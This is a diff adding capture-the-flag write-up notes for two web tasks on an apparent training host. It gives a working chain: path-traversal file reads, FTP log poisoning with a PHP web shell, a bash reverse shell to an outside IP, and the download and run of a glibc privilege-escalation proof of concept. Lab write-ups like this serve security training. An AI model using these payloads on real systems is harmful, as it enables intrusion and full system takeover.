@@ -293,6 +293,39 @@ http://www.edu.stf/api/read.php?file=../../../../etc/pt.flag
 
 **------------------------------------------------------------------------------------------------------------------------------------------------------------------------**
 
+TASK WEB-2-2
+http://www.edu.stf/api/read.php?file=php://filter/convert.base64-encode/resource=read.php
+here we get base-64 string, decode it and understood that php executes code in link => lfi -> rce
+
+http://www.edu.stf/api/read.php?file=../../../../etc/vsftpd.conf
+here we can find exactly path to ftp logs: after command <ftp 10.124.1.235> we can see log here http://www.edu.stf/api/read.php?file=../../../../var/log/vsftpd.log
+
+next, when connect to ftp, username will be: <?php system($_GET['ci']); ?>
+and after that on here http://www.edu.stf/api/read.php?file=../../../../var/log/vsftpd.log&ci=id we can see Wed Jan 28 08:46:05 2026 [pid 70675] CONNECT: Client "10.127.241.115" Wed Jan 28 08:46:08 2026 [pid 70674] [uid=33(www-data) gid=33(www-data) groups=33(www-data) ] FAIL LOGIN: Client "10.127.241.115"
+
+the attack is: http://www.edu.stf/api/read.php?file=../../../../var/log/vsftpd.log&ci=/home/rceflag
+Wed Jan 28 09:00:17 2026 [pid 71212] CONNECT: Client "10.127.241.115" Wed Jan 28 09:00:28 2026 [pid 71211] [fda63fdd-5de6-4828-8ce9-166e47d41193 ] FAIL LOGIN: Client "10.127.241.115"
+
+
+**------------------------------------------------------------------------------------------------------------------------------------------------------------------------**
+
+
+TASK WEB-2-3
+http://www.edu.stf/api/read.php?file=../../../../var/log/vsftpd.log&ci=ldd%20--version
+ldd (Debian GLIBC 2.36-9+deb12u2) 2.36 Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Written by Roland McGrath and Ulrich Drepper.
+
+for getting into the system url: http://www.edu.stf/api/read.php?file=../../../../var/log/vsftpd.log&ci=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.127.241.115/9001%200%3E%261%22
+
+inside:
+cd /tmp
+curl -o poc.py https://raw.githubusercontent.com/KernelKrise/CVE-2023-4911/main/poc.py
+python3 poc.py
+(if id is false, change for nessesary one <sed '/TARGETS = {/a \    "35b410ef6ccdab4a7edeb2fdf801b8b65e8d19cc": 568,' poc.py > poc_temp.py> and then looooooooong waiting)
+whoami
+
+
+**------------------------------------------------------------------------------------------------------------------------------------------------------------------------**
+
 
 TASK WEB-3-1
 URL -> http://127.0.0.1:9732
